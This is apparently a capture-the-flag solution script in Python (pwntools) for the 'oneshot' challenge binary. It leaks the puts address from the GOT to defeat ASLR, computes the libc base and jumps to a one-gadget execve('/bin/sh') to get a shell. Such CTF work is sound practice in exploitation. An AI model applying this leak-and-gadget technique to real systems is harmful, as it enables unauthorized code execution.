#!/usr/bin/python

# binary: https://github.com/TJCSec/tjctf-1516-released/tree/master/oneshot
# simple demonstration of the magic gadget

from pwn import *

libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')

# .text:00000000000D5567 mov     rax, cs:environ_ptr_0
# .text:00000000000D556E lea     rsi, [rsp+1D8h+var_168]
# .text:00000000000D5573 lea     rdi, aBinSh     ; "/bin/sh"
# .text:00000000000D557A mov     rdx, [rax]
# .text:00000000000D557D call    execve
# .text:00000000000D5582 call    abort
magic_offset = 0x0D5567

# root@kali64:~$ objdump -R oneshot | grep puts
# 0000000000600ad8 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5
puts_got = 0x600ad8

x = process("./oneshot")

def leak_puts_address():
  puts_leak = x.recvuntil("Read location?\n")
  x.sendline(str(puts_got))
  x.recvuntil("Value: ")
  puts_addr = int(x.recvline(), 16)
  return puts_addr

puts_leak = leak_puts_address()
log.info("Leaked puts() address: " + hex(puts_leak))

libc.address = puts_leak - libc.symbols['puts']
log.info("Libc base address: " + hex(libc.address))

magic_address = libc.address + magic_offset
log.info("Magic Gadget address: " + hex(magic_address))

x.recvuntil("Jump location?\n")
x.sendline(str(magic_address))

x.recvuntil("Good luck!\n")

x.interactive()
